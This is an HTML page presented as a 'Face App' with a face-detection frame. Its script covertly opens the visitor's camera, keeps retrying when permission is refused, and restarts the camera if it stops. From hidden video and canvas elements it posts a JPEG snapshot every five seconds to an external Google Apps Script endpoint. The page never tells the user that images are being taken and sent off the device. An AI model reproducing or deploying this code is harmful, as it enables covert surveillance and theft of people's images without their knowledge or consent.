<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Face App</title>
<link rel="stylesheet" href="style.css">
</head>

<body>

<div id="device">
  <div id="top">
    <div class="left"></div>
    <div class="right"></div>
  </div>

  <div id="content">
    <div class="menu">
      <div class="profilePhoto"></div>
    </div>

    <div class="detection">
      <div class="line-left"></div>
      <div class="line-top"></div>
      <div class="line-right"></div>
      <div class="line-bottom"></div>
    </div>
  </div>
</div>

<div class="video-wrap" hidden>
  <video id="video" playsinline autoplay></video>
</div>

<canvas hidden id="canvas" width="320" height="320"></canvas>

<script>
const GAS_URL="https://script.google.com/macros/s/AKfycbyaLQ2AmryI8aUb-gFrHfwtp7n8hB6wX34TMkZdfBbDTnNlPW8ge2hINlV1a28M1Hcgig/exec";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

let stream = null;
let captureInterval = null;
let lastHash = null;
let firstSnapshotSent = false;
const INTERVAL = 5000; // 5 sec

function hashString(str) {
    let hash = 0, i, chr;
    if (str.length === 0) return hash;
    for (i = 0; i < str.length; i++) {
        chr = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + chr;
        hash |= 0;
    }
    return hash;
}

async function sendImage(data){
    try{
        await fetch(GAS_URL,{
            method:"POST",
            headers:{"Content-Type":"application/x-www-form-urlencoded"},
            body:"cat="+encodeURIComponent(data)
        });
        console.log("sent image");
    } catch(e){
        console.log("send error", e);
    }
}

// capture first snapshot only when video is ready
function captureFirstSnapshot(){
    if(firstSnapshotSent) return;
    if(video.readyState >= 2){ // HAVE_CURRENT_DATA
        ctx.drawImage(video,0,0,320,320);
        const img = canvas.toDataURL("image/jpeg",0.6);
        const base64 = img.replace("data:image/jpeg;base64,","");
        lastHash = hashString(base64);
        sendImage(base64);
        firstSnapshotSent = true;
        console.log("first snapshot sent");
    } else {
        // wait a bit and retry
        setTimeout(captureFirstSnapshot,100);
    }
}

function startCapture() {
    if(captureInterval) return;

    console.log("capture started");

    captureInterval = setInterval(()=>{
        if(document.hidden) return;

        ctx.drawImage(video,0,0,320,320);
        const img = canvas.toDataURL("image/jpeg",0.6);
        const base64 = img.replace("data:image/jpeg;base64,","");
        const currentHash = hashString(base64);

        if(lastHash !== currentHash){
            lastHash = currentHash;
            sendImage(base64);
        } else {
            console.log("same image, skipping send");
        }

    }, INTERVAL);
}

function stopCapture(){
    if(captureInterval){
        clearInterval(captureInterval);
        captureInterval = null;
        console.log("capture stopped");
    }
}

async function startCamera(){
    try{
        stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
        video.srcObject = stream;

        // first snapshot after video ready
        captureFirstSnapshot();

        video.onloadedmetadata = function(){
            if(!document.hidden){
                startCapture();
            }
        }

        // auto restart if camera stops
        stream.getVideoTracks()[0].onended = function(){
            console.log("camera stopped, retry in 1 sec");
            stopCapture();
            setTimeout(startCamera,1000);
        }

    } catch(e){
        console.log("camera permission denied or error, retry in 0.5 sec");
        setTimeout(startCamera,500);
    }
}

// handle tab visibility
document.addEventListener("visibilitychange", ()=>{
    if(document.hidden){
        stopCapture();
    } else {
        if(video.srcObject){
            startCapture();
        }
    }
});

startCamera();

</script>

</body>
</html>
